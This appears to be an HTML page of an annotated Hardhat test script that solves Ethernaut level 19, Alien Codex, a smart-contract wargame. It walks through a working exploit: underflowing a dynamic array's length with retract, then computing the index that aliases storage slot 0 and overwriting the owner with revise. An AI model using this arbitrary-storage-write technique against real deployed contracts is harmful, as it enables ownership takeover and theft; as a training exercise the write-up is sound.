@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 19: Alien Codex</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 19: Alien Codex</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">BigNumber</span>, <span class="hljs-title class_">Contract</span>, providers, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">TransactionResponse</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@ethersproject/providers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0xe3fB9A42a39326071d1F184C4fb5aA31EDD271C1&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CODEX_SLOT</span> = <span class="hljs-number">1</span>
+<span class="hljs-keyword">const</span> UINT256_ONE = <span class="hljs-string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;19 Alien Codex&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">provider</span>: providers.<span class="hljs-property">Provider</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;AlienCodex&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+    provider = signer.<span class="hljs-property">provider</span>
+  })</pre></div>
+      
+        
+        <p>Before we are permitted to call any of the instance’s other functions,
+the <code>contact</code> flag needs to be set. Conveniently, there’s a public function
+which does just that.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;sets the contacted flag&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">make_contact</span>()
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(instance.<span class="hljs-title function_">contact</span>()).<span class="hljs-property">to</span>.<span class="hljs-property">eventually</span>.<span class="hljs-property">be</span>.<span class="hljs-property">true</span>
+  })</pre></div>
+      
+        
+        <p>Since <code>bytes32[] public codex</code> is a dynamic array, its storage slot (1) holds
+its current length, which initially is zero. <code>retract</code> lets us subtract one from
+the array length, which then underflows to <code>MaxUint256</code>.</p>
+<p>This opens up the instance’s entire memory for writing using <code>revise</code> with
+an arbitrary (<code>0..MaxUint256</code>) array index.</p>
+<p>Note that contracts cannot directly set a dynamic array’s length property anymore
+since Solidity 0.6.0. That’s why 0.5.0 was used for this level.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;retracts on empty array to set array length to MaxUint256&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">retract</span>()
+    <span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>()
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getStorageAt</span>(instance.<span class="hljs-property">address</span>, <span class="hljs-variable constant_">CODEX_SLOT</span>)).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(
+      ethers.<span class="hljs-property">constants</span>.<span class="hljs-property">MaxUint256</span>
+    )
+  })</pre></div>
+      
+        
+        <p>Next we need to know where the <code>owner</code> variable is located relative to where
+the values of <code>bytes32[] public codex</code> are stored in memory.</p>
+<p><code>AlienCodex</code> extends <code>Ownable</code> and therefore has <code>owner</code> at storage slot 0.
+(Both <code>owner</code> and <code>contact</code> are packed into slot 0, leaving the array at slot 1.)</p>
+<p>The memory address of the dynamic array’s <em>values</em> is equal to the keccak256 hash
+of its storage slot number (1). (This is how dynamic array locations are
+calculated, see e.g. <a href="https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html#mappings-and-dynamic-arrays">here</a>.)</p>
+<p>Since <code>owner</code> is at 0, we subtract the address of <code>codex</code> from 0 to get the
+array index of <code>owner</code>. Knowing <code>owner</code> is at <code>codex[ownerIndex]</code>, we can overwrite
+it using <code>revise</code>.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;calculates array index of owner slot and overwrites it with signer address&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> arrayBase = ethers.<span class="hljs-property">utils</span>.<span class="hljs-title function_">keccak256</span>(UINT256_ONE)
+    <span class="hljs-keyword">const</span> ownerIndex = ethers.<span class="hljs-property">constants</span>.<span class="hljs-property">MaxUint256</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">sub</span>(arrayBase)
+    <span class="hljs-keyword">const</span> signerUint256 = <span class="hljs-string">&#x27;0x&#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">padStart</span>(<span class="hljs-number">24</span>, <span class="hljs-string">&#x27;0&#x27;</span>) + signerAddress.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>)
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">revise</span>(ownerIndex, signerUint256)
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies signer has become owner&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">owner</span>()).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(signerAddress)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
